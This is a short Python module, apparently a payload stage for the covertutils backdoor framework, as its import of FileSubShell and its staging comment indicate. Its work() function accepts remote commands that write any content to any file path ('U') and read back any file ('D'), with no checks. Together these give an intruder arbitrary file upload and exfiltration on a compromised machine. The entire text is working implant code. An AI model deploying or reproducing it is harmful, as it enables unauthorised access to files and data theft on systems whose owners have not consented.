


#	TODO: make the D/U buffering to disk instead of memory
def work( storage, message ) :
	try :
		comm = message.split(':', 1)[0]
	except :
		return "ERR"

	if comm == 'U' :
		try :
			comm, filename, content = message.split(':', 2)
		except :
			return "ERR"
		f = open(filename, 'wb')
		f.write(content)
		f.close()
		return "OK"

	if comm == 'D' :
		try :
			comm, filename = message.split(':', 1)
			f = open(filename, 'rb')
			content = f.read()
			f.close()
			return ":".join(["D", content])
		except :
			return "ERR"

		# return content
	return "ERR"


from covertutils.shells.subshells import FileSubShell as shell

# !stage mload covertutils.payloads.generic.file
